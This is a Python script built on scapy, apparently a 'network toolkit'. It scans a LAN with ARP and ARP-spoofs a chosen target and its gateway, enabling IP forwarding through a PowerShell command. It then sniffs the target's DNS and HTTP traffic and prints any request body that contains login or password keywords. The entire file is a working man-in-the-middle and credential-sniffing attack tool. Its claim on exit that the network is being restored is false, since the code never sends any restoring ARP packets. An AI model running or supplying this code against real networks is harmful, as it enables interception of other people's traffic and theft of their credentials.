import scapy.all as scapy
from scapy.layers import http
import argparse
import os
import time
import threading
import sys

class NetToolkit:
    def __init__(self, interface=None):
        self.interface = interface if interface else scapy.conf.iface.name
        self.spoofing_active = True

    def scan(self, ip_range):
        print(f"\n[*] Scanning network: {ip_range}")
        arp_request = scapy.ARP(pdst=ip_range)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        
        answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False, iface=self.interface)[0]
        
        print("-" * 40)
        print("IP Address\t\tMAC Address")
        print("-" * 40)
        for element in answered_list:
            print(f"{element[1].psrc}\t\t{element[1].hwsrc}")

    def spoof(self, target_ip, gateway_ip):
        def get_mac(ip):
            arp_request = scapy.ARP(pdst=ip)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast/arp_request
            ans = scapy.srp(arp_request_broadcast, timeout=2, verbose=False, iface=self.interface)[0]
            return ans[0][1].hwsrc if ans else None

        target_mac = get_mac(target_ip)
        gateway_mac = get_mac(gateway_ip)

        if not target_mac or not gateway_mac:
            print("[!] MAC addresses not found. Exiting...")
            return

        print(f"[*] Spoofing started: {target_ip} <--> {gateway_ip}")
        while self.spoofing_active:
            scapy.send(scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=False)
            scapy.send(scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=False)
            time.sleep(2)

    def sniff(self, target_ip):
        print(f"[*] Sniffing traffic on {self.interface}...")
        scapy.sniff(iface=self.interface, store=False, prn=lambda x: self.process_packet(x, target_ip))

    def process_packet(self, packet, target_ip):
        if packet.haslayer(scapy.DNSQR) and packet[scapy.IP].src == target_ip:
            query = packet[scapy.DNSQR].qname.decode(errors="ignore").rstrip(".")
            print(f"[ DNS ] Site: {query}")

        if packet.haslayer(http.HTTPRequest):
            url = packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
            print(f"[ HTTP ] URL: {url}")
            if packet.haslayer(scapy.Raw):
                load = packet[scapy.Raw].load.decode(errors='ignore')
                keywords = ["user", "pass", "login", "password"]
                if any(k in load.lower() for k in keywords):
                    print(f"\n[!!!] CRITICAL DATA: {load}\n")

def main():
    parser = argparse.ArgumentParser(description="NetToolkit")
    parser.add_argument("-i", "--interface", help="Interface name (Optional)")
    parser.add_argument("-s", "--scan", dest="scan_range", help="Network scan range (e.g., 192.168.1.1/24)")
    parser.add_argument("-t", "--target", help="Target IP")
    parser.add_argument("-g", "--gateway", help="Gateway IP")
    parser.add_argument("--sniff", action="store_true", help="Enable sniffing")

    args = parser.parse_args()
    toolkit = NetToolkit(args.interface)

    try:
        if args.scan_range:
            toolkit.scan(args.scan_range)
        
        elif args.target and args.gateway:
            os.system("powershell -Command \"Set-NetIPInterface -Forwarding Enabled\"")
            
            spoof_thread = threading.Thread(target=toolkit.spoof, args=(args.target, args.gateway))
            spoof_thread.daemon = True
            spoof_thread.start()

            if args.sniff:
                toolkit.sniff(args.target)
            else:
                while True: time.sleep(1)

    except KeyboardInterrupt:
        print("\n[!] Stopping. Restoring network...")
        toolkit.spoofing_active = False
        sys.exit()

if __name__ == "__main__":
    main()